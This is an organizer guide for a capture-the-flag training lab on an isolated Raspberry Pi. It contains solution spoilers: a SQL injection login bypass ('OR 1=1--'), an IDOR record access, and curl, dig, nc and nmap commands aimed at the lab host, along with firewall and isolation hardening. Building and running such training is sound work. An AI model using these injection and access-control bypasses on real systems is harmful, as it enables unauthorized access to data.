# Organizer guide — SPOILERS

Do not distribute this file to players before the event. Flags are generated on the Pi; the bundle does not contain deployed secrets. Challenges are intentionally discoverable and repeatable. All command examples below target **only your own isolated Pi**. Configure your testing laptop so that it is not connected to other networks.

## Five challenges (450 total points)

1. **Discovery — 50:** `GET /robots.txt` reveals `/maintenance/notes.txt`; fetch it for the discovery flag. Lesson: `robots.txt` is indexing guidance, not access control.
2. **SQL injection — 150:** the login builds a SQLite `SELECT` using string interpolation. Submit username `' OR 1=1-- ` and any password. The injected predicate returns the demo admin row and yields the SQLi flag. SQLite runs in a new in-memory database per request. Parameterized statements are used to seed it; this one query is intentionally unsafe. Multi-statement execution is not enabled; no app code calls a shell or enables SQLite extension loading. Connections are explicitly closed. SQL and value lengths and virtual-machine instruction allocation are limited; functions, recursive queries, ATTACH/DETACH and PRAGMA are denied by the authorizer, and execution has a 50-ms progress-handler deadline. The intended basic OR/comment bypass still works.
3. **IDOR — 100:** `/api/record?id=1` returns a player record; change `id=42` to access the admin record. There is deliberately no ownership authorization. The ID is parsed as an integer and used against a fixed set of demo records, not a filesystem path.
4. **DNS — 100:** query `vault.ctf.lan TXT` directly on the Pi. It is an authoritative-only, non-recursive mini-server. `arena.ctf.lan` and `ctf.lan` have A records. Unknown names return NXDOMAIN; supported names queried for other types return empty answers. No forwarding, public resolvers, or DNS tunneling is implemented.
5. **Encoding — 50:** connect to TCP 31337 and ROT13-decode the second line. Lesson: encoding is not encryption.

The flags all use `flag{challenge_<24 random hex digits>}`. Every challenge gets 96 random bits independent of its name. Flags are persistent within one arena and shared across players; rotation regenerates all five. The validator uses constant-time equality but does not implement per-user tracking. Repeated submissions still return correct; each player/challenge must be counted only once by your scorekeeping process.

## Example solutions (Linux/macOS diagnostic tools)

```bash
# Discovery
curl --noproxy '*' http://192.168.77.10:8080/robots.txt
curl --noproxy '*' http://192.168.77.10:8080/maintenance/notes.txt

# SQLi: shell quoting preserves the trailing comment space.
curl --noproxy '*' http://192.168.77.10:8080/login \
  --data-urlencode "username=' OR 1=1-- " --data-urlencode 'password=x'

# IDOR
curl --noproxy '*' 'http://192.168.77.10:8080/api/record?id=42'

# DNS, both transports
# A lack of Internet access is intentional; no recursive resolution is needed.
dig @192.168.77.10 vault.ctf.lan TXT +short
dig @192.168.77.10 vault.ctf.lan TXT +tcp +short

# Banner, including its ROT13-encoded flag
nc -w 3 192.168.77.10 31337
nc -w 3 192.168.77.10 31337 | tail -n 1 | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Flag validation (replace the placeholder with a real deployed flag)
curl --noproxy '*' http://192.168.77.10:8080/submit \
  --data-urlencode 'flag=flag{paste_real_flag_here}'
```

Windows DNS query:

```powershell
Resolve-DnsName -Name vault.ctf.lan -Type TXT -Server 192.168.77.10 -DnsOnly
```

You can use `curl.exe` on Windows for HTTP to avoid PowerShell 5.1's `curl` alias. The landing page includes a flag-submission form, so no separate scoreboard installation is necessary.

## Host/service layout and permissions

- `/opt/ctf-lab/arena.py`: root-owned application code; unprivileged service cannot modify it.
- `/var/lib/ctf-lab/flags.json`: root-owned, `ctf-lab` group-readable, mode 0640; its directory is mode 0750. Root can read it for organizer scoring. The arena necessarily knows all flags; process-level compromise would reveal all of them.
- `/etc/ctf-lab/state.json`: root-only state backup, mode 0600 under mode-0700 directory. It stores settings, not Wi-Fi passwords. Original NetworkManager profiles remain on disk with their existing permissions; they are not copied into the bundle.
- `/etc/ctf-lab/firewall.nft`: the kit's dedicated `inet ctf_lab` table definition.
- `/etc/sysctl.d/90-ctf-lab.conf`: disable IPv4 and IPv6 forwarding persistently.
- `/usr/local/sbin/ctf-pi-setup`: root-only installed copy of the setup utility.
- `ctf-lab.service`: four listeners in one service process as system user `ctf-lab`, no login shell. Only `CAP_NET_BIND_SERVICE` is granted so it can bind DNS port 53; it gets no root account, `CAP_NET_ADMIN`, or raw-packet capability.
- `ctf-lab-firewall.service`: root oneshot that loads nftables before NetworkManager at boot and before the arena is started.
- `ctf-lab-cutover.service`: persistent, root-only pending-cutover recovery unit. Its condition marker is removed only after the arena reports readiness; interrupted pending cutovers can resume at boot. Keep the Pi isolated throughout recovery.

The application service uses `NoNewPrivileges`, read-only system/code/data mounts, hidden home directories, private temporary space, kernel/control-group protections, and resource caps. This is defense in depth; no one should claim Python's in-process SQLi challenge is a complete isolation boundary. Do not expand it into arbitrary command execution without a separate VM/container design, a threat review, and a new recovery model.

## nftables semantics

The installer first refuses pre-existing nftables rules and active competing firewall/Docker/dhcpcd services. It then disables the distro `nftables.service` for this dedicated lab so that a later generic `/etc/nftables.conf` load cannot flush the kit's table. Its prior active/enabled state is saved for removal. The loader replaces **only** `inet ctf_lab` in one nftables transaction; it does not `flush ruleset`.

- Input: loopback allowed; non-eth0 ingress dropped; non-loopback IPv6 dropped; invalid conntrack dropped; established/related IPv4 allowed on eth0. New traffic from `192.168.77.0/24` may reach TCP 22/53/8080/31337, UDP 53, and ICMP.
- Forward: drop all, even if a forwarding sysctl were accidentally enabled.
- Output: loopback allowed; eth0 IPv4 replies only to `192.168.77.0/24` with conntrack state established/related; all new outbound sessions and all other output are dropped. ARP is layer 2 and is not blocked by an `inet` table. The Pi does not run DHCP, NAT, a bridge, or DNS recursion.
- No default route is configured for the Pi. NetworkManager's lab profile has `ipv4.never-default=yes`, `ipv4.ignore-auto-dns=yes`, and `ipv6.method=disabled`.
- SSH is firewall-permitted only for organizer administration if already enabled. The script does not enable SSH, change account credentials, or disable existing organizer access checks. TCP 22 is out of challenge scope.

Important boundaries: the output rule prevents new Pi-originated sessions to the router or other players; it permits responses to allowed inbound traffic. It does not prevent an application from returning sensitive data through an already established authorized client connection. Input source addresses are not cryptographic identities. The stock AP/switch does not isolate participants from each other or protect its own UI from lab clients. IPv6 in the **Pi** is blocked; separately disable router IPv6 features when available. Physical isolation plus scope enforcement is mandatory; this kit is inappropriate for hostile participants whom you do not trust to respect lab boundaries.

## Before inviting players: operator checks on actual hardware

1. Visually inspect the empty yellow WAN port, every blue LAN cable, and all client adapters. Remove normal-network uplinks, VPNs, hotspots, ICS, bridges, and USB cellular interfaces. Do not use the router guest SSID, which may block access to the Pi.
2. Verify `ip -4 addr show eth0` shows only the intended active `.10/24` profile; verify `ip -4 route` has the connected `192.168.77.0/24` route and **no default route**. `nmcli radio wifi` should report disabled. Other physical interfaces must not supply a path to another network.
3. On the Pi, `sudo nft list table inet ctf_lab` must show all three drop-policy chains. `sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding` should both be 0.
4. Confirm local readiness with `curl --noproxy '*' http://192.168.77.10:8080/health`. Solve all five challenges above. Query both DNS transports.
5. From an authorized lab client, inspect only the Pi's ports with `nmap -sT -p 22,53,80,443,8080,31337 192.168.77.10`; use `sudo nmap -sU -p 53 192.168.77.10` for UDP. UDP silence is ambiguous (`open|filtered`); the TXT answer is stronger positive evidence. Do not scan other players or the router.
6. Verify external routing fails **without sending external probes**: at the Pi run `ip -4 route get 1.1.1.1`. It should report that the network is unreachable. This command performs a local route lookup, not a packet transmission. A missing route is only one check; it does not prove the entire router/client LAN is isolated.
7. Reboot the Pi, then repeat the address, route, Wi-Fi, firewall, service, and challenge checks. Confirm flags did not change. The author did not have your hardware and cannot certify these checks for you.
8. Perform an SD-card backup and a console recovery rehearsal before the event.

## Troubleshooting

- **Pi unreachable after cutover:** use its console; inspect `nmcli connection show`, `ip -4 address`, and `journalctl -u ctf-lab-cutover`. Confirm router subnet and cable placement. Do not plug WAN back in as a troubleshooting shortcut.
- **Legacy Pi OS/dhcpcd:** use a fresh NetworkManager-based Raspberry Pi OS image. The kit intentionally does not rewrite legacy network stacks.
- **Package preparation fails:** fix repository/time/network access before isolation. No challenges were started by `prepare`.
- **Service cannot bind:** inspect `journalctl -u ctf-lab` and `ss -lntup`; ensure `.10` is present and a different service is not already bound to `.10` ports 53, 8080, or 31337. A resolver bound only to `127.0.0.53` is not inherently a conflict. Do not disable unknown services blindly; use a dedicated fresh image.
- **Slow boot/no Ethernet yet:** the unit requests NetworkManager's online wait and keeps retrying failed application binds without a start-limit lockout. First fix the cable/profile/address; inspect `journalctl -u ctf-lab -u ctf-lab-cutover`. If needed, `sudo systemctl restart ctf-lab`. `Type=notify` readiness occurs only after all four listeners bind.
- **Players can access the Internet:** disconnect the unintended uplink immediately; stop `ctf-lab` while investigating. Pi firewall checks cannot certify player-side isolation.
- **Uninstall partially fails:** remain offline and use the console/SD backup. Installer rollback does not reconstruct removed original profiles, reverse apt updates, or restore router UI settings.
- **NetworkManager configuration modified later:** the kit does not continuously monitor or remediate changes. Treat the network/firewall profile as organizer-controlled state, and recheck it before each event.
